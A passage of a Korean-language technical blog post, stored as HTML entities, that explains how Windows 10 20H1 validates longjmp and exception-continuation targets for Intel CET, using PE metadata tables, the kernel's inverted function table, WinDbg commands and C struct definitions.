&#xD14C;&#xC774;&#xBE14;&#xC744; &#xC0DD;&#xC131;&#xD55C;&#xB2E4;.</p><p>&#xC774; &#xB9C8;&#xC9C0;&#xB9C9; &#xC139;&#xC158;&#xC5D0;&#xC11C;&#xB294; &#xC774;&#xB7EC;&#xD55C; &#xD14C;&#xC774;&#xBE14;&#xC758; &#xD615;&#xC2DD;&#xACFC; &#xCEE4;&#xB110;&#xC774; &#xB9C8;&#xC9C0;&#xB9C9; &#xB450; &#xAC00;&#xC9C0; &#xC720;&#xD615;&#xC758; <code>KCONTINUE_TYPE</code> &#xC81C;&#xC5B4; &#xD750;&#xB984;&#xC744; &#xAC80;&#xC99D;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xC744; &#xC0B4;&#xD3B4;&#xBCF4;&#xACA0;&#xB2E4;.</p><h2 id="PE-&#xBA54;&#xD0C0;-&#xB370;&#xC774;&#xD130;-&#xD14C;&#xC774;&#xBE14;"><a href="#PE-&#xBA54;&#xD0C0;-&#xB370;&#xC774;&#xD130;-&#xD14C;&#xC774;&#xBE14;" class="headerlink" title="PE &#xBA54;&#xD0C0; &#xB370;&#xC774;&#xD130; &#xD14C;&#xC774;&#xBE14;"></a>PE &#xBA54;&#xD0C0; &#xB370;&#xC774;&#xD130; &#xD14C;&#xC774;&#xBE14;</h2><p>Windows 10&#xC740; Control Flow Guard &#xC774;&#xBBF8;&#xC9C0;&#xC5D0; &#xC788;&#xB294; &#xD45C;&#xC900; GFIDS &#xD14C;&#xC774;&#xBE14; &#xC678;&#xC5D0;&#xB3C4;  RVA&#xAC00; &#xC800;&#xC7A5;&#xB418;&#xB294; <code>.gljmp</code>&#xB77C;&#xB294; PE Image Load Configuration&#xC758; <code>Guard Long Jump Target Table</code> &#xD544;&#xB4DC;&#xC5D0; &#xC800;&#xC7A5;&#xB41C; PE &#xC139;&#xC158;&#xC758; Long Jump Target Table&#xC744; &#xD3EC;&#xD568;&#xD558;&#xC5EC; longjump &#xB300;&#xC0C1;&#xC758; &#xC720;&#xD6A8;&#xC131; &#xAC80;&#xC0AC;&#xC5D0; &#xB300;&#xD55C; &#xC9C0;&#xC6D0;&#xC744; &#xCD94;&#xAC00;&#xD588;&#xB2E4;.</p><p><code>setjmp</code>&#xC5D0; &#xB300;&#xD55C; &#xD638;&#xCD9C;&#xC774; &#xCF54;&#xB4DC;&#xC5D0;&#xC11C; &#xC218;&#xD589;&#xB420; &#xB54C;&#xB9C8;&#xB2E4; &#xBC18;&#xD658; &#xC8FC;&#xC18C; (longjmp&#xAC00; &#xBD84;&#xAE30;&#xB418;&#xB294; &#xC704;&#xCE58;)&#xC758; RVA&#xAC00; &#xC774; &#xD14C;&#xC774;&#xBE14;&#xC5D0; &#xCD94;&#xAC00;&#xB41C;&#xB2E4;. &#xC774; &#xD14C;&#xC774;&#xBE14;&#xC758; &#xC874;&#xC7AC; &#xC5EC;&#xBD80;&#xB294; Image Load Configuration Directory&#xC758; <code>GuardFlags</code>&#xC5D0; &#xC788;&#xB294; <code>IMAGE_GUARD_CF_LONGJUMP_TABLE_PRESENT</code> &#xD50C;&#xB798;&#xADF8;&#xC5D0; &#xC758;&#xD574; &#xACB0;&#xC815;&#xB418;&#xBA70; <code>GuardLongJumpTargetCount</code> &#xD544;&#xB4DC;&#xC5D0; &#xD45C;&#xC2DC;&#xB41C; &#xB9CC;&#xD07C;&#xC758; &#xD56D;&#xBAA9;&#xC744; &#xD3EC;&#xD568;&#xD55C;&#xB2E4;.</p><p>&#xAC01; &#xD56D;&#xBAA9;&#xC740; 4 &#xBC14;&#xC774;&#xD2B8; RVA&#xC640; n &#xBC14;&#xC774;&#xD2B8;&#xC758; &#xBA54;&#xD0C0; &#xB370;&#xC774;&#xD130;&#xC774;&#xB2E4;. &#xC5EC;&#xAE30;&#xC11C; n&#xC740; <code>(GuardFlags &amp; IMAGE_GUARD_CF_FUNCTION_TABLE_SIZE_MASK) &gt;&gt; IMAGE_GUARD_CF_FUNCTION_TABLE_SIZE_SHIFT</code>&#xC758; &#xACB0;&#xACFC;&#xC5D0;&#xC11C; &#xAC00;&#xC838;&#xC628;&#xB2E4;. &#xC774; &#xD14C;&#xC774;&#xBE14;&#xC758; &#xACBD;&#xC6B0; &#xBA54;&#xD0C0; &#xB370;&#xC774;&#xD130;&#xAC00; &#xC815;&#xC758;&#xB418;&#xC9C0; &#xC54A;&#xC558;&#xC73C;&#xBBC0;&#xB85C; &#xBA54;&#xD0C0; &#xB370;&#xC774;&#xD130; &#xBC14;&#xC774;&#xD2B8;&#xB294; &#xD56D;&#xC0C1; 0&#xC774; &#xB420; &#xAC83;&#xC73C;&#xB85C; &#xC608;&#xC0C1;&#xB41C;&#xB2E4;. &#xC774; &#xACC4;&#xC0B0;&#xC740; <code>GFIDS</code> &#xD14C;&#xC774;&#xBE14; (<code>export suppression</code>&#xAC00; &#xD65C;&#xC131;&#xD654;&#xB41C; &#xACBD;&#xC6B0; &#xC7A0;&#xC7AC;&#xC801;&#xC73C;&#xB85C; &#xBA54;&#xD0C0; &#xB370;&#xC774;&#xD130;&#xAC00; &#xC788;&#xC74C;)&#xC5D0; &#xC0AC;&#xC6A9;&#xB41C; &#xACC4;&#xC0B0;&#xACFC; &#xB3D9;&#xC77C;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xD558;&#xB098; &#xC774;&#xC0C1;&#xC758; CFG &#xB300;&#xC0C1;&#xC744; &#xC5B5;&#xC81C;&#xD558;&#xBA74; 1 &#xBC14;&#xC774;&#xD2B8;&#xC758; &#xBE48; &#xBA54;&#xD0C0;&#xB370;&#xC774;&#xD130;&#xAC00; Long Jump Target Target Table&#xC758; &#xBAA8;&#xB4E0; &#xD56D;&#xBAA9;&#xC5D0; &#xCD94;&#xAC00;&#xB41C;&#xB2E4;.</p><p>&#xC608;&#xB97C; &#xB4E4;&#xC5B4; &#xB2E4;&#xC74C;&#xC740; &#xB450; &#xAC1C;&#xC758; <code>longjmp</code> &#xB300;&#xC0C1;&#xC774; &#xC788;&#xB294; PE &#xD30C;&#xC77C;&#xC774;&#xB2E4;.</p><p><img src="/2021/01/17/l0ch/cet-on-windows/8.png" alt></p><p>&#xC774; &#xC774;&#xBBF8;&#xC9C0;&#xB3C4; CFG &#xB0B4;&#xBCF4;&#xB0B4;&#xAE30; &#xC5B5;&#xC81C;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xBBC0;&#xB85C; <code>GuardFlags</code>&#xC758; &#xC0C1;&#xC704; &#xB2C8;&#xBE14; (<code>IMAGE_GUARD_CF_FUNCTION_TABLE_SIZE_MASK</code>&#xC5D0; &#xD574;&#xB2F9;)&#xC5D0; &#xC788;&#xB294; &#xAC12; 1&#xC5D0; &#xC720;&#xC758;&#xD558;&#xC790;. &#xC774;&#xB294; &#xC544;&#xB798;&#xC5D0;&#xC11C; &#xBCFC; &#xC218; &#xC788;&#xB294; Long Jump Target Table&#xC5D0; 1 &#xBC14;&#xC774;&#xD2B8;&#xC758; &#xCD94;&#xAC00; &#xBA54;&#xD0C0; &#xB370;&#xC774;&#xD130;&#xAC00; &#xC788;&#xC74C;&#xC744; &#xC54C;&#xB824;&#xC900;&#xB2E4;.</p><p><img src="/2021/01/17/l0ch/cet-on-windows/9.png" alt></p><p><code>Windows 10 20H1</code>&#xC5D0;&#xC11C; &#xC774;&#xB7EC;&#xD55C; &#xC720;&#xD615;&#xC758; &#xBA54;&#xD0C0; &#xB370;&#xC774;&#xD130;&#xB294; &#xC5F0;&#xC18D; &#xB300;&#xC0C1;&#xC5D0; &#xB300;&#xD55C; &#xC608;&#xC678; &#xD578;&#xB4E4;&#xB7EC;&#xAC00; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC758; &#xC81C;&#xC5B4; &#xD750;&#xB984;&#xC758; &#xC77C;&#xBD80;&#xB85C; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xACBD;&#xC6B0;&#xC5D0; &#xD3EC;&#xD568;&#xB41C;&#xB2E4;. &#xB450; &#xAC1C;&#xC758; &#xC0C8;&#xB85C;&#xC6B4; &#xD544;&#xB4DC; <code>GuardEHContinuationTable</code> &#xBC0F; <code>GuardEHContinuationCount</code>&#xAC00; Image Load Configuration Directory &#xB05D;&#xC5D0; &#xCD94;&#xAC00;&#xB418;&#xACE0; <code>IMAGE_GUARD_EH_CONTINUATION_TABLE_PRESENT</code> &#xD50C;&#xB798;&#xADF8;&#xAC00; <code>GuardFlags</code>&#xC5D0; &#xD3EC;&#xD568;&#xB41C;&#xB2E4;. &#xC774; &#xD14C;&#xC774;&#xBE14;&#xC758; &#xB808;&#xC774;&#xC544;&#xC6C3;&#xC740; <code>GuardFlags</code>&#xC758; &#xC0C1;&#xC704; &#xB2C8;&#xBE14;&#xC744; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xD55C; &#xBA54;&#xD0C0; &#xB370;&#xC774;&#xD130; &#xBC14;&#xC774;&#xD2B8; &#xCD94;&#xAC00;&#xB97C; &#xD3EC;&#xD568;&#xD558;&#xC5EC; Long Jump Target Table&#xC5D0; &#xB300;&#xD574; &#xD45C;&#xC2DC;&#xB41C; &#xAC83;&#xACFC; &#xB3D9;&#xC77C;&#xD558;&#xB2E4;.</p><p>&#xC548;&#xD0C0;&#xAE5D;&#xAC8C;&#xB3C4; Visual Studio 2019 &#xBC84;&#xC804;&#xC5D0;&#xC11C;&#xB3C4; &#xC774; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xC9C0; &#xC54A;&#xC73C;&#xBBC0;&#xB85C; &#xD604;&#xC7AC; &#xC608;&#xC81C;&#xB97C; &#xBCF4;&#xC5EC;&#xC904; &#xC218; &#xC5C6;&#xB2E4;. &#xC774; &#xBD84;&#xC11D;&#xC740; &#xB098;&#xC911;&#xC5D0; &#xC124;&#xBA85;&#xD558;&#xB294; &#xC720;&#xD6A8;&#xC131; &#xAC80;&#xC0AC; &#xCF54;&#xB4DC;&#xC640; 20H1 SDK&#xC758; <code>Ntimage.h</code> &#xD5E4;&#xB354; &#xD30C;&#xC77C;&#xC744; &#xB9AC;&#xBC84;&#xC2A4; &#xC5D4;&#xC9C0;&#xB2C8;&#xC5B4;&#xB9C1; &#xD55C; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xD55C;&#xB2E4;.</p><h2 id="&#xC0AC;&#xC6A9;&#xC790;-&#xBC18;&#xC804;-&#xAE30;&#xB2A5;-&#xD14C;&#xC774;&#xBE14;"><a href="#&#xC0AC;&#xC6A9;&#xC790;-&#xBC18;&#xC804;-&#xAE30;&#xB2A5;-&#xD14C;&#xC774;&#xBE14;" class="headerlink" title="&#xC0AC;&#xC6A9;&#xC790; &#xBC18;&#xC804; &#xAE30;&#xB2A5; &#xD14C;&#xC774;&#xBE14;"></a>&#xC0AC;&#xC6A9;&#xC790; &#xBC18;&#xC804; &#xAE30;&#xB2A5; &#xD14C;&#xC774;&#xBE14;</h2><p>&#xC774;&#xC81C; longjmp &#xB300;&#xC0C1; &#xB610;&#xB294; &#xC5F0;&#xC18D; &#xB300;&#xC0C1;&#xC5D0; &#xB300;&#xD55C; &#xC608;&#xC678; &#xD578;&#xB4E4;&#xB7EC;&#xB85C; &#xBD84;&#xAE30;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC81C;&#xC5B4; &#xD750;&#xB984; &#xBCC0;&#xACBD;&#xC774; &#xBC1C;&#xC0DD;&#xD560; &#xC218; &#xC788;&#xC74C;&#xC744; &#xC54C;&#xACE0; &#xC788;&#xC73C;&#xBBC0;&#xB85C; CONTEXT_EX&#xC5D0; &#xC788;&#xB294; RIP &#xC8FC;&#xC18C;&#xB97C; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xC774; &#xB450; &#xD14C;&#xC774;&#xBE14;&#xC744; &#xC5B4;&#xB5BB;&#xAC8C; &#xC5BB;&#xC744; &#xC218; &#xC788;&#xC744;&#xAE4C;? NtContinueEx &#xC804;&#xD654;? &#xC774;&#xB7F0; &#xC791;&#xC5C5;&#xC740; &#xD2B9;&#xC815; &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xC2E4;&#xD589;&#xC5D0;&#xC11C; &#xC790;&#xC8FC; &#xBC1C;&#xC0DD;&#xD560; &#xC218; &#xC788;&#xC73C;&#xBBC0;&#xB85C; &#xCEE4;&#xB110;&#xC740; &#xC774; &#xBB38;&#xC81C;&#xB97C; &#xD574;&#xACB0;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xD6A8;&#xC728;&#xC801;&#xC778; &#xBC29;&#xBC95;&#xC774; &#xD544;&#xC694;&#xD558;&#xB2E4;.</p><p><code>Inverted Function Table</code>&#xC758; &#xAC1C;&#xB150;&#xC5D0; &#xC774;&#xBBF8; &#xC775;&#xC219;&#xD560; &#xAC83;&#xC774;&#xB2E4;. &#xC774;&#xB7EC;&#xD55C; &#xD14C;&#xC774;&#xBE14;&#xC740; <code>Ntdll.dll (LdrpInvertedFunctionTable)</code> &#xC5D0;&#xC11C; &#xC720;&#xC800; &#xBAA8;&#xB4DC; &#xC608;&#xC678; &#xCC98;&#xB9AC; &#xC911; &#xD574;&#xC81C; opcode &#xBC0F; &#xC608;&#xC678; &#xB370;&#xC774;&#xD130;&#xB97C; &#xCC3E;&#xB294; &#xB370; &#xC0AC;&#xC6A9;&#xB41C;&#xB2E4;. (<code>.pdata</code> &#xC139;&#xC158;&#xC744; &#xCC3E;&#xC544;&#xC11C;) <code>Ntoskrnl.exe (PsInvertedFunctionTable)</code>&#xC5D0; &#xB610; &#xB2E4;&#xB978; &#xD14C;&#xC774;&#xBE14;&#xC774; &#xC788;&#xC73C;&#xBA70; &#xCEE4;&#xB110; &#xBAA8;&#xB4DC; &#xC608;&#xC678; &#xCC98;&#xB9AC; &#xBC0F; PatchGuard &#xAC80;&#xC0AC;&#xC758; &#xC77C;&#xBD80;&#xC5D0; &#xC0AC;&#xC6A9;&#xB41C;&#xB2E4;.</p><p>&#xAC04;&#xB2E8;&#xD788; &#xB9D0;&#xD574; <code>Inverted Function Table</code>&#xC740; &#xB85C;&#xB4DC;&#xB41C; &#xBAA8;&#xB4E0; &#xC720;&#xC800;/&#xCEE4;&#xB110; &#xBAA8;&#xB4C8; &#xD06C;&#xAE30;&#xC640; &#xAC00;&#xC0C1; &#xC8FC;&#xC18C;&#xBCC4;&#xB85C; &#xC815;&#xB82C;&#xB41C; PE &#xC608;&#xC678; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xC5D0; &#xB300;&#xD55C; &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xD3EC;&#xD568;&#xD558;&#xB294; &#xBC30;&#xC5F4;&#xC774;&#xB2E4;. &#xC774; &#xBC30;&#xC5F4;&#xC744; &#xAC80;&#xC0C9;&#xD558;&#xB294; &#xAC83;&#xC774; PE &#xD5E4;&#xB354;&#xB97C; &#xAD6C;&#xBB38; &#xBD84;&#xC11D;&#xD55C; &#xB4A4; &#xB85C;&#xB4DC;&#xB41C; &#xBAA8;&#xB4C8; &#xC5F0;&#xACB0; &#xBAA9;&#xB85D;&#xC744; &#xAC80;&#xC0C9;&#xD558;&#xB294; &#xAC83;&#xBCF4;&#xB2E4; &#xD6E8;&#xC52C; &#xBE60;&#xB974;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC5ED;&#xD568;&#xC218; &#xD14C;&#xC774;&#xBE14;&#xC758; binary search&#xB294; &#xB85C;&#xADF8;(n) &#xC870;&#xD68C;&#xC5D0;&#xC11C;&#xB9CC; &#xD574;&#xB2F9; &#xBAA8;&#xB4C8;&#xC758; &#xAC00;&#xC0C1; &#xC8FC;&#xC18C;&#xB97C; &#xBE60;&#xB974;&#xAC8C; &#xCC3E;&#xB294;&#xB2E4;. &#xD604;&#xC7AC; Microsoft&#xC758; &#xBA85;&#xC131;&#xC744; &#xC5BB;&#xACE0; &#xC788;&#xB294; Ken Johnson&#xACFC; Matt Miller&#xB294; &#xC774;&#xC804;&#xC5D0; Uninformed Magazine&#xC5D0; <a href="http://uninformed.org/index.cgi?v=8&amp;a=2&amp;p=20">&#xCEE4;&#xB110; &#xBAA8;&#xB4DC; &#xD6C4;&#xD0B9; &#xAE30;&#xC220;</a>&#xC5D0; &#xB300;&#xD55C; &#xAE30;&#xC0AC;&#xC758; &#xC77C;&#xBD80;&#xB85C; &#xAC1C;&#xC694;&#xB97C; &#xAC8C;&#xC2DC;&#xD588;&#xB2E4;.</p><p>&#xADF8;&#xB7EC;&#xB098; &#xC774;&#xC804;&#xC5D0;&#xB294; <code>Ntdll.dll</code>&#xC740; &#xD14C;&#xC774;&#xBE14;&#xC5D0;&#xC11C; &#xC720;&#xC800; &#xBAA8;&#xB4DC; &#xC608;&#xC678;&#xB9CC;, <code>Ntoskrnl.exe</code>&#xB294; &#xCEE4;&#xB110; &#xBAA8;&#xB4DC; &#xC608;&#xC678;&#xB9CC; &#xAC80;&#xC0AC;&#xD588;&#xB2E4;. <code>20H1</code>&#xC758; &#xBCC0;&#xACBD; &#xC0AC;&#xD56D;&#xC740; &#xCEE4;&#xB110;&#xB3C4; &#xC0AC;&#xC6A9;&#xC790; &#xD14C;&#xC774;&#xBE14;&#xC744; &#xAC80;&#xC0AC;&#xD574;&#xC57C; &#xD55C;&#xB2E4;&#xB294; &#xAC83;&#xC774;&#xB2E4;. <code>longjmp</code> &#xBC0F; &#xC608;&#xC678; &#xC5F0;&#xC18D;&#xC744; &#xCC98;&#xB9AC;&#xD558;&#xB294; &#xB370; &#xD544;&#xC694;&#xD55C; &#xC0C8;&#xB85C;&#xC6B4; &#xB85C;&#xC9C1;&#xC744; &#xC9C0;&#xC6D0;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC0C8;&#xB85C;&#xC6B4; <code>RtlpLookupUserFunctionTableInverted</code> &#xD568;&#xC218;&#xAC00; &#xCD94;&#xAC00;&#xB418;&#xC5B4; <code>KeUserInvertedFunctionTable</code> &#xBCC0;&#xC218;&#xB97C; &#xC2A4;&#xCE94;&#xD558;&#xACE0; <code>Ntdll.dll</code>&#xC5D0;&#xC11C; &#xD604;&#xC7AC; &#xB0B4;&#xBCF4;&#xB0B8; <code>LdrpInvertedFunctionTable</code> &#xC2EC;&#xBCFC;&#xC5D0; &#xB9E4;&#xD551;&#xB41C;&#xB2E4;.</p><p>&#xC774;&#xAC83;&#xC740; &#xD765;&#xBBF8;&#xB85C;&#xC6B4; &#xD3EC;&#xB80C;&#xC2DD; &#xAE30;&#xB2A5;&#xC73C;&#xB85C;, &#xCEE4;&#xB110;&#xC5D0;&#xC11C; PEB&#xC758; &#xB85C;&#xB354; &#xB370;&#xC774;&#xD130;&#xB97C; &#xAD6C;&#xBB38; &#xBD84;&#xC11D;&#xD558;&#xAC70;&#xB098; VAD&#xB97C; &#xC5F4;&#xAC70;&#xD560; &#xD544;&#xC694; &#xC5C6;&#xC774; &#xD604;&#xC7AC; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xB0B4;&#xC5D0; &#xB85C;&#xB4DC;&#xB41C; &#xC720;&#xC800; &#xBAA8;&#xB4DC; &#xBAA8;&#xB4C8;&#xC744; &#xC27D;&#xAC8C; &#xCC3E;&#xC744; &#xC218; &#xC788;&#xB2E4;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4; &#xB2E4;&#xC74C;&#xC740; <code>Csrss.exe</code>&#xC5D0;&#xC11C; &#xD604;&#xC7AC; &#xB85C;&#xB4DC;&#xB41C; &#xC774;&#xBBF8;&#xC9C0;&#xB97C; &#xBCF4;&#xB294; &#xBC29;&#xBC95;&#xC774;&#xB2E4;.</p><pre><code class="hljs c">dx @$cursession.Processes.Where(p =&gt; p.Name == <span class="hljs-string">&quot;csrss.exe&quot;</span>).First().SwitchTo()dx -r0 @$table = *(nt!_INVERTED_FUNCTION_TABLE**)&amp;nt!KeUserInvertedFunctionTabledx -g @$table-&gt;TableEntry.Take(@$table-&gt;CurrentSize)</code></pre><p>&#xC989;, &#xC6D0;&#xACA9;&#xC5D0;&#xC11C;&#xB3C4; &#xD2B9;&#xD788; <code>unwind opcode</code> &#xAC00;&#xC5C6;&#xB294; x86 &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0;&#xC11C;&#xB294; &#xC774;&#xBBF8;&#xC9C0;&#xAC00; &#xC608;&#xC678; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xB97C; &#xD3EC;&#xD568;&#xB418;&#xC9C0; &#xC54A;&#xC744; &#xAC00;&#xB2A5;&#xC131;&#xC774; &#xC788;&#xC73C;&#xBA70;, <code>.pdata</code>&#xB294; <code>/SAFESEH</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xACE0; &#xC801;&#xC5B4;&#xB3C4; &#xD558;&#xB098;&#xC758; &#xC608;&#xC678; &#xD578;&#xB4E4;&#xB7EC;&#xAC00; &#xC788;&#xB294; &#xACBD;&#xC6B0;&#xC5D0;&#xB9CC; &#xC0DD;&#xC131;&#xB41C;&#xB2E4;.</p><p>&#xC774;&#xB7EC;&#xD55C; &#xC0C1;&#xD669;&#xC5D0;&#xC11C;&#xB294; <code>RtlpLookupUserFunctionTableInverted</code>&#xAC00; &#xC2E4;&#xD328;&#xD560; &#xC218; &#xC788;&#xC73C;&#xBA70; &#xB300;&#xC2E0; <code>MmGetImageBase</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD574;&#xC57C; &#xD55C;&#xB2E4;. &#xC774;&#xAC83;&#xC740; &#xC785;&#xB825; RIP&#xC5D0; &#xD574;&#xB2F9;&#xD558;&#xB294; &#xC601;&#xC5ED;&#xC744; &#xB9E4;&#xD551;&#xD558;&#xB294; VAD&#xB97C; &#xC870;&#xD68C;&#xD558;&#xACE0; &#xC774;&#xBBF8;&#xC9C0; VAD &#xC778; &#xACBD;&#xC6B0; &#xD574;&#xB2F9; &#xC601;&#xC5ED;&#xC758; &#xAE30;&#xBCF8; &#xC8FC;&#xC18C;&#xC640; &#xD06C;&#xAE30; (&#xBAA8;&#xB4C8;&#xC758; &#xD06C;&#xAE30;&#xC640; &#xC77C;&#xCE58;&#xD574;&#xC57C; &#xD568;)&#xB97C; &#xBC18;&#xD658;&#xD55C;&#xB2E4;.</p><p><img src="/2021/01/17/l0ch/cet-on-windows/10.png" alt></p><h2 id="&#xC5F0;&#xC18D;&#xB41C;-&#xB300;&#xC0C1;&#xC5D0;-&#xB300;&#xD55C;-&#xB3D9;&#xC801;-&#xC608;&#xC678;-&#xD578;&#xB4E4;&#xB7EC;"><a href="#&#xC5F0;&#xC18D;&#xB41C;-&#xB300;&#xC0C1;&#xC5D0;-&#xB300;&#xD55C;-&#xB3D9;&#xC801;-&#xC608;&#xC678;-&#xD578;&#xB4E4;&#xB7EC;" class="headerlink" title="&#xC5F0;&#xC18D;&#xB41C; &#xB300;&#xC0C1;&#xC5D0; &#xB300;&#xD55C; &#xB3D9;&#xC801; &#xC608;&#xC678; &#xD578;&#xB4E4;&#xB7EC;"></a>&#xC5F0;&#xC18D;&#xB41C; &#xB300;&#xC0C1;&#xC5D0; &#xB300;&#xD55C; &#xB3D9;&#xC801; &#xC608;&#xC678; &#xD578;&#xB4E4;&#xB7EC;</h2><p><code>KCONTINUE_UNWIND</code> &#xC694;&#xCCAD;&#xC744; &#xCC98;&#xB9AC;&#xD558;&#xB294;&#xB370; &#xB9C8;&#xC9C0;&#xB9C9; &#xC7A5;&#xC560;&#xBB3C;&#xC774; &#xD558;&#xB098; &#xC788;&#xB2E4;. &#xC815;&#xADDC; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0;&#xB294; &#xCF54;&#xB4DC;&#xC758; <code>__try /__except /__finally</code> &#xC808;&#xC744; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xD558;&#xB294; &#xC5F0;&#xC18D;&#xB41C; &#xB300;&#xC0C1;&#xC5D0; &#xB300;&#xD55C; &#xC815;&#xC801; &#xC608;&#xC678; &#xD578;&#xB4E4;&#xB7EC;&#xAC00; &#xC788;&#xC9C0;&#xB9CC; Windows&#xC5D0;&#xC11C;&#xB294; JIT &#xC5D4;&#xC9C4;&#xC774; &#xC2E4;&#xD589; &#xAC00;&#xB2A5;&#xD55C; &#xCF54;&#xB4DC;&#xB97C; &#xB3D9;&#xC801;&#xC73C;&#xB85C; &#xC989;&#xC2DC; &#xC0DD;&#xC131;&#xD560; &#xC218; &#xC788;&#xC744; &#xBFD0;&#xB9CC; &#xC544;&#xB2C8;&#xB77C; <code>RtlAddFunctionTable</code> API &#xB4F1;&#xC744; &#xD1B5;&#xD574; &#xB7F0;&#xD0C0;&#xC784;&#xC5D0; &#xC608;&#xC678; &#xD578;&#xB4E4;&#xB7EC;&#xB97C; &#xB4F1;&#xB85D;&#xD558;&#xACE0; opcode&#xB97C; &#xD574;&#xC81C;&#xD560; &#xC218; &#xC788;&#xB2E4;. &#xC774;&#xB7EC;&#xD55C; &#xC608;&#xC678; &#xD578;&#xB4E4;&#xB7EC;&#xB294; &#xC774;&#xC804;&#xC5D0;&#xB294; &#xC0AC;&#xC6A9;&#xC790; &#xBAA8;&#xB4DC; stack walking &#xBC0F; &#xC608;&#xC678; &#xD574;&#xC81C;&#xC5D0;&#xB9CC; &#xD544;&#xC694;&#xD588;&#xC9C0;&#xB9CC; &#xC774;&#xC81C;&#xB294; &#xC5F0;&#xC18D; &#xD578;&#xB4E4;&#xB7EC;&#xAC00; &#xCEE4;&#xB110;&#xC774; RIP&#xC5D0; &#xB300;&#xD574; &#xC7A0;&#xC7AC;&#xC801;&#xC73C;&#xB85C; &#xC720;&#xD6A8;&#xD55C; &#xAC12;&#xC73C;&#xB85C; &#xCC98;&#xB9AC;&#xD574;&#xC57C; &#xD558;&#xB294; &#xC81C;&#xC5B4; &#xD750;&#xB984; &#xB300;&#xC0C1;&#xC774; &#xB41C;&#xB2E4;. <code>RtlpFindDynamicEHContinuationTarget</code>&#xC774; &#xCC98;&#xB9AC;&#xD558;&#xB294; &#xAC83;&#xC774; &#xB9C8;&#xC9C0;&#xB9C9; &#xAC00;&#xB2A5;&#xC131;&#xC774;&#xB2E4;.</p><p>CET &#xC9C0;&#xC6D0; &#xBC0F; <code>NtContinueEx</code> &#xB3C4;&#xC785;&#xC758; &#xC77C;&#xBD80;&#xB85C; EPROCESS &#xAD6C;&#xC870;&#xB294; <code>DynamicEHContinuationTargetsLock</code> &#xBC0F; <code>DynamicEHContinuationTargetsTree</code>&#xB77C;&#xB294; &#xB450; &#xAC1C;&#xC758; &#xC0C8;&#xB85C;&#xC6B4; &#xD544;&#xB4DC;&#xB85C; &#xD5A5;&#xC0C1;&#xB418;&#xC5C8;&#xB2E4;. &#xCCAB; &#xBC88;&#xC9F8;&#xB294; <code>EX_PUSH_LOCK</code>&#xC774;&#xACE0; &#xB450; &#xBC88;&#xC9F8;&#xB294; &#xBAA8;&#xB4E0; &#xC720;&#xD6A8;&#xD55C; &#xC608;&#xC678; &#xD578;&#xB4E4;&#xB7EC; &#xC8FC;&#xC18C;&#xB97C; &#xD3EC;&#xD568;&#xD558;&#xB294; <code>RTL_RB_TREE</code>&#xC774;&#xB2E4;. &#xC774; &#xD2B8;&#xB9AC;&#xB294; <code>PROCESS_DYNAMIC_EH_CONTINUATION_TARGETS_INFORMATION</code> &#xC720;&#xD615;&#xC758; &#xB370;&#xC774;&#xD130; &#xAD6C;&#xC870;&#xC640; &#xD568;&#xAED8; &#xC0C8;&#xB85C;&#xC6B4; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xC815;&#xBCF4; &#xD074;&#xB798;&#xC2A4; &#xC778; <code>ProcessDynamicEHContinuationTargets</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; <code>NtSetInformationProcess</code>&#xC5D0; &#xB300;&#xD55C; &#xD638;&#xCD9C;&#xC744; &#xD1B5;&#xD574; &#xAD00;&#xB9AC;&#xB41C;&#xB2E4;. &#xB354; &#xC27D;&#xAC8C; &#xC774;&#xD574;&#xD558;&#xB824;&#xBA74; &#xC774;&#xB7EC;&#xD55C; &#xAD6C;&#xC870; &#xBC0F; &#xD50C;&#xB798;&#xADF8;&#xC5D0; &#xB300;&#xD55C; &#xC544;&#xB798; &#xC815;&#xC758;&#xB97C; &#xCC38;&#xC870;&#xD558;&#xBA74; &#xB41C;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DYNAMIC_EH_CONTINUATION_TARGET_ADD          0x01</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DYNAMIC_EH_CONTINUATION_TARGET_PROCESSED    0x02</span><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">PROCESS_DYNAMIC_EH_CONTINUATION_TARGET</span></span><span class="hljs-class">{</span>     ULONG_PTR TargetAddress;    ULONGLONG Flags;} PROCESS_DYNAMIC_EH_CONTINUATION_TARGET, *PPROCESS_DYNAMIC_EH_CONTINUATION_TARGET;<span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">PROCESS_DYNAMIC_EH_CONTINUATION_TARGETS_INFORMATION</span></span><span class="hljs-class">{</span>    USHORT NumberOfTargets;    USHORT Reserved;    ULONG Reserved2;    PPROCESS_DYNAMIC_EH_CONTINUATION_TARGET* Targets;} PROCESS_DYNAMIC_EH_CONTINUATION_TARGETS_INFORMATION, *PPROCESS_DYNAMIC_EH_CONTINUATION_TARGETS_INFORMATION;</code></pre><p><code>PspProcessDynamicEHContinuationTargets</code> &#xD568;&#xC218;&#xAC00; &#xC774; &#xB370;&#xC774;&#xD130;&#xB97C; 